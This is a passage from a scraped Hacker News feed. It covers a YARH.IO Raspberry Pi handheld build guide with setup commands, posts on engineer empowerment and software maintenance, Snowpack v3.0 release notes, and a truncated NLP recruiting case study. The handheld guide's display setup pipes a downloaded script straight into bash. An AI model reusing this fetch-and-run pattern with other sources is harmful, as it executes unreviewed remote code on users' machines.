                        <p>YARH.IO Micro 2 can run Raspberry Pi OS or Kali Linux, providing users with a rich range of applications and development tools.&nbsp;This is a rare handheld that allows users to write new program code directly on the device for the use on the device itself.</p>
                    </div>
                </div>
                <div>
                    <div>
                        <p>YARH.IO Micro 2 is powered by&nbsp;Raspberry Pi 3B+, offering the best ratio of functionality and computing power requirements for a mobile, battery powered device. The board is stripped down to reduce the total height. The ethernet RJ45 connector on the Pi 3B+ has been removed, while the double stack USB connectors were replaced with single stack USB connectors.<br></p>
                        <p>Pimoroni Hyper Pixel 4" IPS 800x480 display delivers a sharp, clear, and bright picture with a wide viewing angle. Capacitive&nbsp;touch screen with multi-touch allows for a simple and easy interaction with the user interface.<br></p>
                        <p>Minimalist keyboard provides comfortable typing when holding the device with both hands. Modifier keys grant easy access to special control keys and functions. Custom key remapping simplifies interaction with the system and its applications.</p>
                    </div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-accessories-large-t-002.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-accessories-large-t-002.png" alt="YARH.IO M2 Handheld with accessories"></a></p>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-left-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-left-large-t-001.png" alt="YARH.IO M2 Handheld front left"></a></p>
                    <div>
                        <p>YARH.IO Micro 2 features extended USB connectivity. The two USB ports have been relocated to the top of the device and now allow users to simultaneously connect large profile USB accessories, such as WiFi adaptors, cellular modems, GPS, USB drives, and others.<br></p>
                        <p>A single, removable, high capacity Fenix ARB-L18-3500U 3500mAh Li-ion USB Rechargeable Battery powers the device. Removable battery ensures that an empty battery can be quickly replaced with a charged one. Fenix rechargeable battery provides direct charging via a Micro USB connector and a built-in battery charger.</p>
                        <p>High output Step-Up power supply has been used to effectively support power hungry USB accessories.&nbsp;</p>
                    </div>
                </div>
                <div>
                    <div>
                        <p>Arduino proMicro module controls the battery voltage. The module reads battery and power supply voltage, making the results available over I2C bus to the Raspberry Pi and to various custom build applications. The module also controls power LED as a way to indicate battery charge status.</p>
                        <p>With Arduino IDE installed, it is possible to program proMicro directly on the device, to customize battery charge LED indicator, and to add other creative functionality.</p>
                        <p>The DS3231 High Precision RTC Clock Module is used to store current time and date for the Raspberry Pi.</p>
                    </div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-top-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-top-large-t-001.png" alt="YARH.IO M2 Handheld top front"></a></p>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-back-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-back-large-t-001.png" alt="YARH.IO M2 Handheld Back"></a></p>
                    <div>
                        <p>YARH.IO Micro 2 features simple mechanical design. Main frame used for mounting Raspberry Pi board and screen, power bed with conjunction with front panel provides mounting points for keyboard, power supply, battery, RTC and proMicro module.&nbsp;</p>
                        <p>Back panel features an open battery bay, allowing for quick battery replacement. In instances when&nbsp;battery&nbsp;replacement is not required, the bay can be covered with the battery cover. This set-up ensures that the battery can always be charged using the battery's built-in charger.</p>
                        <p>The I2C bus is available while the I2C connector is mounted on the right side of the device and can be used to connect external modules with I2C connectivity.&nbsp;Pimoroni Hyper Pixel display utilises all Raspberry Pi GPIO pins, therefore no additional GPIO connectors are present for the external devices.&nbsp;<br></p>
                    </div>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-back-open-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-back-open-large-t-001.png" alt="YARH.IO M2 Handheld internals"></a></p>
                    <div>
                        <p>No 'click' assembly used. This is a fully hackable device with stainless steel button socket cap screws used&nbsp;throughout for multiple assembly and disassembly cycles.<br></p>
                        <p>The&nbsp;corners of the housing are protected with eight rugged-design rubber bumpers.&nbsp;<br></p>
                        <p>All parts are 3D printed using PLA and Flex plastics. ABS and ASA plastics can be used as an alternative, but require use of advanced printers and techniques.<br></p>
                        
                        <p>The list of parts used for the YARH.IO project can be purchased from Amazon and other online stores is available below.</p>
                    </div>
                </div>
                <div>
                    
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-front-kali-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-front-kali-large-t-001.png" alt="YARH.IO M2 Handheld Kali"></a></p>
                </div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-usb-accessories-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-usb-accessories-large-t-001.png" alt="YARH.IO M2 Handheld USB accessories"></a></p>
                    <div>
                        <p>YARH.IO Micro 2 Project at a Glance.&nbsp;</p>
                        <p>The outcome of this YARH.IO Micro 2 is a micro-size (116mm x 123mm x 27mm) handheld with the potential to run a unlimited applications and to be extended with an unlimited range of external USB devices. It is portable, has minimalist design, and can be relatively easily 3D printed and assembled.<br></p>
                        <p>The release of YARH.IO Micro 2 marks a new success in our line-up of goals&nbsp;towards the design, development, and release of innovative handhelds for hacking, coding, and creative use by computer experts and enthusiasts.&nbsp;<br></p>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section id="yarh-io-mki-gallery">
        
    </section>
    <section id="yarh-io-mki-downloads">
        
    </section>
    <section id="yarh-io-mki-assembly-gallery">
        
    </section>
    <section id="yarh-io-mki-software">
        <div>
            <div>
                <p id="heading-software">
                    <h2>System &amp; Software<br></h2>
                </p>
                <div>
                    <div>
                        <div>
                            <h4>Software packages</h4><p><code>sudo apt install tmux vim mc -y<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>HyperPixel screen</h4><p><code>curl -sSL https://get.pimoroni.com/hyperpixel4 | bash<br></code><code>hyperpixel4-rotate right<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>Turn off HyperPixel on shutdown</h4>
                            <p>The original link:&nbsp;https://github.com/pimoroni/hyperpixel4/issues/3. Thank you&nbsp;Florian Mirkes.<br></p><p><code># Create&nbsp;/etc/systemd/system/hyperpixel4-backlight.service and add the following:<br></code><code>[Unit]<br>Description=Sets up gpio-poweroff to handle Hyperpixel backlight upon shutdown/reboot<br>ConditionPathExists=/usr/bin/hyperpixel4-init<br>ConditionPathExists=/boot/overlays/gpio-poweroff.dtbo<br>ConditionPathExists=/usr/bin/dtoverlay<br>DefaultDependencies=no<br>Before=umount.target<br>[Service]<br>Type=oneshot<br>ExecStart=/bin/sh -c '/sbin/rmmod gpio-backlight;/usr/bin/dtoverlay /boot/overlays/gpio-poweroff.dtbo gpiopin=19 active_low=1'<br>[Install]<br>WantedBy=reboot.target halt.target poweroff.target<br></code><code>sudo systemctl enable hyperpixel4-backlight.service<br></code><code>sudo systemctl start hyperpixel4-backlight.service<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>Enable right-click for the Raspberry Pi touchscreen</h4>
                            <p>The original article :&nbsp;https://fmirkes.github.io/articles/20190827.html. Thank you&nbsp;Philip Howard.<br></p><p><code>sudo apt install build-essential libevdev2 libevdev-dev -y<br></code><code>git clone 'https://github.com/PeterCxy/evdev-right-click-emulation.git'<br></code><code>cd 'evdev-right-click-emulation'<br></code><code>make all<br></code><code>sudo cp 'out/evdev-rce' '/usr/local/bin/'<br></code><code>sudo chmod +x '/usr/local/bin/evdev-rce'<br></code><code># Add evdev-rce to startup<br></code><code>sudo usermod -G 'input' -a pi<br></code><code>echo 'uinput' | sudo tee -a /etc/modules<br></code><code># Edit: /etc/udev/rules.d/99-uinput.rules<br></code><code>KERNEL=="uinput", MODE="0660", GROUP="input"<br></code><code>sudo udevadm control --reload-rules<br></code><code>sudo udevadm trigger<br></code><code>mkdir ~/.config/autostart<br></code><code># Create: ~/.config/autostart/evdev-rce.desktop and add the following:<br></code><code>[Desktop Entry]<br>Version=1.0<br>Type=Application<br>Name=evdev-rce<br>GenericName=Enable long-press-to-right-click gesture<br>Exec=env LONG_CLICK_INTERVAL=500 LONG_CLICK_FUZZ=50 /usr/local/bin/evdev-rce<br>Terminal=true<br>StartupNotify=false<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>RTC</h4><p><code># Create: ~/.rtc-init.sh and add the following:<br></code><code>echo "ds1307 0x68" | sudo -E tee -a /sys/bus/i2c/devices/i2c-11/new_device<br></code><code>sudo chmod +x ~/.rtc-init.sh<br></code><code># Create&nbsp;~/.config/autostart/rtc-init.desktop and add the following:<br></code><code>[Desktop Entry]<br>Version=1.0<br>Type=Application<br>Name=rtc-init<br>GenericName=Initialize ds3231 RTC on non standard i2c-11 bus, address 0x68<br>Exec=sh /home/pi/.rtc-init.sh<br>Terminal=true<br>StartupNotify=false<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>Bluetooth Keyboard</h4>
                            <p>To connect Bluetooth keyboard for the first time use Bluetooth icon on the menu bar and select Add device. Press hard the Blue Bluetooth button on the keyboard, blue light on the keyboard starts blinking. The keyboard icon and name Bluetooth Keyboard should appear in the …</p></div></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yarh.io/yarh-io-m2.html">https://yarh.io/yarh-io-m2.html</a></em></p>]]>
            </description>
            <link>https://yarh.io/yarh-io-m2.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780972</guid>
            <pubDate>Thu, 14 Jan 2021 19:22:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Empower Your Engineers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780965">thread link</a>) | @kevsim
<br/>
January 14, 2021 | https://blog.kitemaker.co/empower-your-engineers | <a href="https://web.archive.org/web/*/https://blog.kitemaker.co/empower-your-engineers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1610650371617/1MRe8SNnz.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>I recently read a great article by Gergely Orosz called <a target="_blank" href="https://blog.pragmaticengineer.com/what-silicon-valley-gets-right-on-software-engineers/">"What Silicon Valley "Gets" about Software Engineers that Traditional Companies Do Not"</a>, and in it he makes a few points that really resonated with me as an engineering leader:</p>
<ul>
<li>Treat engineers as <strong>"Curious problem solvers, not mindless resources"</strong></li>
<li>Engineers need <strong>"Exposure to the business and to business metrics"</strong></li>
<li><strong>"SV-like companies think of engineers as value generators, and creative problem solvers. Traditional companies think of them as factory workers."</strong></li>
</ul>
<p>When I think back on the very best teams I've managed over the years - the ones where we got the most done, delighted our users the most, and had the most fun - these were the teams where the engineers were truly <em>empowered</em>. They weren't treated like cogs in some machine, they we actively engaged in understanding what problems our users and our business faced, and they took part in deciding what we were going to do to address those problems.</p>
<p>"So what's the upside here?", you might ask. To put it succinctly - empowered engineers solve more of the right problems quicker and are more satisfied doing so. Marty Cagan says that empowering your engineers is the <a target="_blank" href="https://svpg.com/the-most-important-thing/">single most important factor</a> towards moving your team from a feature factory to an integrated product team. To get a bit more specific on the benefits:</p>
<ul>
<li>Your engineers will have more context for every problem they solve. They will understand which things are really big issues for the users and the business, not just the technical challenges they face.</li>
<li>Your engineers will have more buy-in. Can you think of a team you've worked on where the product manager decides what's going to be done and the engineers walk away grumbling that the PM doesn't have a clue what they're doing? I bet you can.</li>
<li>Talking to users and understanding user research will help the engineers do their job. Rather than only getting user insights secondhand, your engineers will directly understand your users' needs.</li>
<li>You'll better leverage the collective problem solving skills of your team.</li>
<li>Your engineers will be inspired by talking to users and understanding the context and vision for your business. They'll be more engaged and motivated. They'll take your users' problems personally.</li>
</ul>
<p>Alright, so let's say you have a team today where the engineers are decidedly <em>not</em> empowered. How do you make steady progress towards a more empowered team? There's no magic formula, but here are some things that have worked well for me over the years:</p>
<ul>
<li>As John Cutler says, <a target="_blank" href="https://cutlefish.substack.com/p/tbm-453-teach-by-starting-together">start together</a>. I can't emphasize this one enough. Don't have your PM come to the engineers with a finished spec for what they're going to build. Even if they have free rein for how to implement it, that's not empowerment. Get the entire team together at the very beginning of any initiative.</li>
<li>Have your engineers take part in user research and give them other opportunities to talk to users. Nothing helps an engineer understand a user's pain quite as much as watching it. And as an engineer myself, I know this can be horribly painful but you've simply got to do it. By having everyone on the team talking to users, it democratizes access to the insights needed to have good discussions within the team.</li>
<li>Break down the wall between design and engineering. One of the collaborations that can leave engineers feeling distinctly un-empowered is relationship between designers and coders. If this "collaboration" involves designers tossing finished designs over the fence to their engineering counterpart, then that's not a collaboration. This one is particularly addressable - beyond starting together, have your designer and engineer work side-by-side and iterate together. Instead of handing over design work, have the designer and engineering sit together and design by changing the UI code directly.</li>
<li>Build trust in your team in order to actually get engineers to speak up. I wrote a <a target="_blank" href="https://medium.com/kitemaker-blog/you-need-to-get-your-team-talking-21c6a6803b1c">separate blog post</a> with some tips for this one.</li>
<li>Expose your entire team to business and product metrics.</li>
<li>Hire for the behaviors you want to see. If candidates show no interest in your actual business, just the technical aspects of the role, question whether they're the right fit. Make sure engineers understand that active participation in discussions around the product is really part of their job description.</li>
<li>Resist the voices in your head that might tell you "if we do this, our engineers will spend less time coding." Trust your team and trust in the benefits of being an integrated product team which truly collaborates closely.</li>
</ul>
<p>I hope this is a useful starting point for you to start discussing these ideas in your teams. It's not an easy path, but the benefits can be huge.</p>
<p>PS - plenty of people disagree with this viewpoint. <a target="_blank" href="https://twitter.com/uxdxconf/status/1323656416796827652">Here's a fun video/discussion</a> you should check out to see some different perspectives.</p>
<hr>
<p>Thanks for reading! Did you find this article useful? If you want to see more material like this follow <strong><a target="_blank" href="https://hashnode.com/@ksimons">@ksimons</a></strong> and <strong><a target="_blank" href="https://hashnode.com/@KitemakerHQ">@KitemakerHQ</a></strong> on Twitter.</p>
<p>Photo by <a target="_blank" href="https://unsplash.com/s/photos/discussion?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Headway</a> on <a target="_blank" href="https://unsplash.com/s/photos/discussion?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>
<hr>
<p>Kevin Simons is the CTO of Kitemaker, the collaboration tool made for teams building things their users want</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.kitemaker.co/empower-your-engineers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780965</guid>
            <pubDate>Thu, 14 Jan 2021 19:22:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Making Software Sisyphean?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780764">thread link</a>) | @aarondf
<br/>
January 14, 2021 | https://aaronfrancis.com/2021/is-making-software-sisyphean | <a href="https://web.archive.org/web/*/https://aaronfrancis.com/2021/is-making-software-sisyphean">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><a href="https://en.wikipedia.org/wiki/Sisyphus">Sisyphus</a>, a character of Greek Mythology, was exceedingly crafty, deceitful, and made a pattern of tricking the gods. As a punishment for his deceitfulness, Zeus cursed Sisyphus in the afterlife. His punishment?</p>
<p>To push a boulder up a hill.</p>
<p>That doesn't seem so bad! But there is one little catch: every time the boulder got close to the top of the hill, it would roll back down. Every time. For all of eternity.</p>
<p><span>Sisyphus was cursed to eternally repeat a task that couldn't be finished.</span></p>
<p>I thought this article was about software development? Well...</p>
<p><img src="https://d8nrpaglj2m0a.cloudfront.net/8a060038-44ba-4e05-a25b-4768c1ac1082/images/articles/awkward-monkey.png">
</p>   
<h2>Pushing the Boulder Up The Hill</h2>
<p><a href="https://john.do/software/">Software</a> <a href="https://hackernoon.com/software-is-never-finished-only-released-a026222176f7">is</a> <a href="https://www.plutora.com/blog/gold-master-why-modern-software-is-never-finished">never</a> <a href="https://www.symph.co/blog/why-software-is-never-finished/">finished</a>.</p>
<p>Even if a piece of software is feature complete and totally bug-free (ha!), you can't simply leave it alone forever. Software rots.</p>
<p>Everything continues to move along, even when your software doesn't. The underlying OS needs upgrades, your programming language version will eventually be EOL'ed, your dependencies will need upgrades, external APIs you rely on will change or go away completely.</p>
<p>Don't even get me started on browsers.</p>
<p>And those are just things that are <em>not</em> your code. We haven't even started talking about all the code directly under your control. There are always more features to add, more bugs to fix, sections that need to be refactored, emergent concepts that need to be formalized, bad abstractions that need to be undone.</p>
<p>Monoliths! → Microservices! → Monoliths! → Heat Death of the Universe</p>
<p><img src="https://d8nrpaglj2m0a.cloudfront.net/8a060038-44ba-4e05-a25b-4768c1ac1082/images/articles/sisyphus-shadow.jpg">
</p>
<h2>The Top of the Hill is a Myth</h2>
<p>Are we Sisyphus? Are we doomed to meaningless labor for all eternity?</p>
<p>Absolutely not. For software developers, we have to know that <span>the top of the hill is a myth</span>. Sisyphus was continually trying to reach the top to complete his task, for us there is no finished. There is only the journey along the way.</p>
<p>We're not doomed, tragic figures. <span>We're gardeners tending to an ever-changing landscape.</span> Carefully pruning, planting, and weeding.</p>
<p>A gardener is never finished, only finished for today.</p>
<p>Setting your focus on being completely done will make your work along the way will feel a lot like fruitless toil.</p>
<p>Setting your focus on the work at hand will bring you the joy of a gardener — crafting order from chaos, even if only for today.</p>
        </div><div>
            <p><img src="https://d8nrpaglj2m0a.cloudfront.net/8a060038-44ba-4e05-a25b-4768c1ac1082/images/profile.jpg">
            </p>
            
        </div></div>]]>
            </description>
            <link>https://aaronfrancis.com/2021/is-making-software-sisyphean</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780764</guid>
            <pubDate>Thu, 14 Jan 2021 19:10:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Autocode Is Now Deployless]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780618">thread link</a>) | @beefman
<br/>
January 14, 2021 | https://autocode.com/community/announcements/autocode-is-now-deployless/ | <a href="https://web.archive.org/web/*/https://autocode.com/community/announcements/autocode-is-now-deployless/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://autocode.com/community/announcements/autocode-is-now-deployless/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780618</guid>
            <pubDate>Thu, 14 Jan 2021 19:01:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snowpack v3.0]]>
            </title>
            <description>
<![CDATA[
Score 43 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25780589">thread link</a>) | @dsego
<br/>
January 14, 2021 | https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0 | <a href="https://web.archive.org/web/*/https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>
      <p>Snowpack v3.0 is here! This is our biggest release yet with brand new features including:</p>
<ul>
<li><strong>Pre-bundled streaming imports</strong> - Import any npm package, on-demand.</li>
<li><strong>Integrated build optimizations</strong> - Built-in bundling, preloading, minification, and more.</li>
<li><strong>JavaScript API</strong> - Integrate with Snowpack’s brand new native JS API.</li>
<li><strong>Node.js Runtime API</strong> - Import your Snowpack-built files directly into Node.js.</li>
<li><strong>Bug fixes, stability improvements, and a whole lot more!</strong></li>
</ul>
<p>Install the newest version of Snowpack to get started:</p>
<pre><code>$ npm install snowpack@^3.0.0
</code></pre>
<p>Or, try out one of our updated <a href="https://www.npmjs.com/package/create-snowpack-app">Create Snowpack App</a> starter templates:</p>
<pre><code>$ npx create-snowpack-app new-project-directory --template  @snowpack/app-template-react
</code></pre>
<h2 id="reimagining-web-development-for-esm">Reimagining Web Development for ESM</h2>
<p>1 year ago, Snowpack first released with the mission to reimagine web development for modern JavaScript and ESM. Snowpack leverages modern web features to deliver a frontend build tool that needs just 50ms to start up &amp; react to new file changes, regardless of project size. In comparison, traditional web bundlers could take several seconds or even full minutes to start up in large projects.</p>
<p>Snowpack v3.0 marks another huge leap on our mission to push web development forward with the release of <strong>streaming imports</strong>. Streaming imports make it possible to import any package directly into your project, pre-built and pre-bundled for immediate use. It’s the power of the entire JavaScript ecosystem, at your fingertips.</p>
<video preload="auto" autoplay="" loop="" muted="" playsinline="">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.webm" type="video/webm">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.mp4" type="video/mp4">
</video>
<h2 id="what-are-streaming-imports%3F">What are Streaming Imports?</h2>
<p>The typical web developer installs and manages their JavaScript dependencies locally using a package manager CLI like <code>npm</code>, <code>yarn</code> or <code>pnpm</code>. These npm packages can’t run directly in the browser, so additional work is needed to resolve, process, build and bundle these packages for the browser before you can actually use them.</p>
<p><strong>What if we could simplify this? What if you could skip the “npm install” step entirely and just fetch the relevant, pre-built package code on-demand via ESM import?</strong></p>
<pre><code><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'react'</span><span>;</span><p><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'https://cdn.skypack.dev/react@17.0.1'</span><span>;</span></p></code></pre>
<p>That URL in the example above points to <a href="https://www.skypack.dev/">Skypack</a>, a popular JavaScript CDN that we built to serve every package&nbsp;on npm as ESM. Importing dependencies by URL like this is well supported in Snowpack, Deno, and all major browsers. But writing these URLs directly into your source code isn’t ideal and makes development impossible without a network connection.</p>
<p><strong>Snowpack v3.0 brings together the best of both worlds:</strong> Get the simplicity of <code>import 'react'</code> in your own source code and let Snowpack fetch these dependencies behind the scenes, pre-built and ready to run in the browser. Snowpack caches everything for you automatically, so you can continue to work offline after the first package fetch.</p>
<p>This new workflow has several benefits over the traditional “npm install” approach:</p>
<ul>
<li><strong>Speed:</strong> Skip the install + build steps for dependencies, and load your dependencies on-demand as pre-build, pre-bundled ESM code.</li>
<li><strong>Safety:</strong> ESM packages are pre-built into JavaScript for you and never given access to <a href="https://www.usenix.org/system/files/sec19-zimmermann.pdf">run code on your machine</a>. Third-party code only ever runs sandboxed in the browser.</li>
<li><strong>Less Tooling:</strong> ESM packages are managed by Snowpack, so frontend projects that don’t need Node.js (Rails, PHP, etc.) can drop the npm CLI entirely if they choose.</li>
<li><strong>Identical Final Build:</strong> When you build your site for production, package code is transpiled with the rest of your site and tree-shaken to your exact set of imports.</li>
</ul>
<p>This is our bet on the future of web development. But if this all sounds too wild for you or you have some technical reason to keep managing your dependencies with npm, don’t worry. This is <strong>100% opt-in</strong> behavior for those who want it. By default, Snowpack will continue to pull your npm package dependencies out of your project <code>node_modules</code> directory like it always has.</p>
<p>Check out our guide on <a href="https://www.snowpack.dev/guides/streaming-imports">Streaming Package Imports</a> to learn more about how to enable this new behavior in your project today.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-esbuild.png" alt="js api"></p>
<h2 id="built-in-optimizations%2C-powered-by-esbuild">Built-in Optimizations, Powered by esbuild</h2>
<p><a href="https://esbuild.github.io/">esbuild</a> is a marvel: it performs 100x faster than most other popular bundlers their own benchmarks. esbuild is written in Go, a compiled language that can parallelize heavy bundling workloads where other popular bundlers – written in JavaScript – cannot.</p>
<p>Snowpack already uses esbuild internally as our default single-file builder for JavaScript, TypeScript and JSX files. Snowpack v3.0 takes this integration one step further, with a new built-in build optimization pipeline. Bundle, minify, and transpile your site for production in 1/100th of the time of other bundlers.</p>
<p>Snowpack is able to adopt esbuild today thanks to an early bet that we made on the future of bundling: <strong>bundling is just a post-build optimization.</strong> Thanks to this early design decision, esbuild can be plugged in and swapped out of your Snowpack build as easily as any other bundler.</p>
<p>esbuild is still a young project, but its future looks promising. In the meantime, we will also continue to invest in the existing bundler plugins for a long time to come, so that more mature projects can continue to use mature bundlers like Webpack &amp; Rollup.</p>
<p>To get started, check out the <code>optimize</code> option in our newest <a href="https://www.snowpack.dev/guides/optimize-and-bundle">Optimizing Your Snowpack Build</a> guide.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-jsapi.png" alt="js api"></p>
<h2 id="a-new-javascript-api">A New JavaScript API</h2>
<p>Snowpack’s new JavaScript API grants you more advanced control over Snowpack’s dev server and build pipeline, helping you build more powerful integrations on top of Snowpack to unlock new kinds of dev tooling and server-side rendering (SSR) solutions.</p>
<p><a href="https://svelte.dev/blog/whats-the-deal-with-sveltekit">SvelteKit</a> is the new official web app framework from the Svelte team, built with Snowpack. SvelteKit uses our new JavaScript API to manage the build pipeline and build files on-demand. Snowpack helps SvelteKit speed up development, with zero rapid updates on file change and zero upfront server start-up cost.</p>
<p><a href="https://www.npmjs.com/package/microsite">Microsite</a> is another exciting new project built with Snowpack. Microsite is a Static Site Generator (SSG) for Preact that features automatic partial hydration, so that you send as little JavaScript down to the client as possible.</p>
<p>Check out our new <a href="https://www.snowpack.dev/reference/javascript-interface">JavaScript API reference</a> to start building your own custom integrations on top of Snowpack.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-runtime.png" alt="js api"></p>
<h2 id="a-new-node.js-runtime">A New Node.js Runtime</h2>
<p>Speaking of Svelte, this next feature comes directly out of our collaboration with the Svelte team. As a part of building out SvelteKit, Rich Harris created a server-side runtime for Snowpack. This runtime lets you import any Snowpack-built file directly into Node.js, handling things like ESM-&gt;CJS conversion and CSS extraction automatically.</p>
<p>The result is a unified build pipeline across both Node.js and the frontend, with all of the on-demand build performance benefits of Snowpack. Importing frontend code to run in Node.js unlocks features like true server-side rendering (SSR), test runner integrations for Jest/uvu/Mocha, and more.</p>
<p>Check out our new <a href="https://www.snowpack.dev/guides/server-side-render">SSR guide</a> to get started and learn more about all of the different ways that you can connect to your Snowpack build.</p>
<p>🥳</p>
<h2 id="snowpack%E2%80%99s-one-year-anniversary">Snowpack’s One Year Anniversary</h2>
<p>Last week marked Snowpack’s one-year anniversary of the original v1.0.0 release. Looking back, I’m blown away by everything that’s happened since:</p>
<ul>
<li>150+ releases (from <code>v0.0.1</code>, all the way to v3.0 today)</li>
<li><a href="https://www.snowpack.dev/plugins">100+ Snowpack plugins</a> to choose from (and growing fast!)</li>
<li><a href="https://github.com/snowpackjs/snowpack/graphs/contributors">100+ individual contributors</a></li>
<li><a href="https://github.com/snowpackjs/snowpack/stargazers">15,000+ stars on GitHub</a></li>
<li>#1 Developer Productivity Boost Winner, <a href="https://osawards.com/javascript/2020">2020 JS Open Source Awards</a></li>
<li>#1 Highest Developer Interest, <a href="https://2020.stateofjs.com/en-US/technologies/build-tools/">2020 State of JS</a></li>
<li>#1 Highest Developer Satisfaction (tied), 2020 State of JS</li>
</ul>
<p>A huge thank you to everyone who has contributed code to Snowpack, and the hundreds of developers joining us on GitHub and on <a href="https://discord.com/invite/snowpack">Discord</a>. This project wouldn’t exist today without you and your support. Thank you!</p>
<p>– Fred K. Schott <a href="https://twitter.com/FredKSchott">(@FredKSchott)</a></p>

    </article>
    </div></div>]]>
            </description>
            <link>https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780589</guid>
            <pubDate>Thu, 14 Jan 2021 18:59:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reducing Time-to-Hire and Finding Niche Candidates via Text Mining and NLP]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25780588">thread link</a>) | @cl42
<br/>
January 14, 2021 | https://joinphase.com/talent-acquisition-nlp | <a href="https://web.archive.org/web/*/https://joinphase.com/talent-acquisition-nlp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>

   

    <p>Reducing Time-to-Hire and Finding Niche Candidates via Text Mining and NLP

    </p>
    
  </div>
</div><div>
  <div>

   

    <div>

<p><b>Summary:</b> Maison Battat, a global toy company, recently hired a uniquely qualified data science candidate in only 26 days. Phase describes how we worked with Maison Battat to build a text mining (i.e., “Natural Language Processing” or “NLP”) approach that could scan 1,000s of candidates in minutes and look for unique attributes and experiences shared by applicants and broader candidate pools alike.

</p><p>Skip to: <a href="#problem">Problem</a> | <a href="#solution">Solution</a> | <a href="#results">Result</a> | <a href="#quotes">Quotes</a>

    </p></div>

    </div>

    
  </div><div>
  <div>

   

    <div>

<p><a name="problem"></a>The Problem: too many candidates and poor screening options

</p><p>Most applicant screening systems are limited in how they enable searching and filtering of candidates. This means that they rarely allow you to include unique combinations of skills or score candidate profiles in a more flexible manner.

</p><p>Worse still, many job applications have <i>hundreds</i> or <i>thousands</i> of applicants. If you expand this to a passive pool, you can be looking at 10,000+ candidates for a single role. Hiring managers and recruiters struggle with reviewing so many profiles, and resort to keyword searches.

</p><p><a name="solution"></a>Our Solution: use recent advances in text mining to make candidate searches descriptive and holistic

</p><p>To address the challenge above, Phase uses two strategies to solve this problem.

</p><p><b>1. Make the search a conversational process</b>

</p><p>Rather than simply providing keywords, we ask recruiters to use a freeform description of the candidate they are looking for. To use the Battat example above...

</p><center>
<div><p>
A conventional exact-match keyword search might look like:</p><p>&nbsp;

“<span>Python</span>”, “<span>SQL</span>”, “<span>analyst</span>”, “<span>engineer</span>” or “<span>toys</span>”
</p><p>&nbsp;
But through our search, the candidate is described as:
</p><p>&nbsp;
“A <span>data scientist</span> who has with experience with
 <span>toys</span>, <span>education</span>, or <span>children’s products</span>.”
</p></div>
</center>

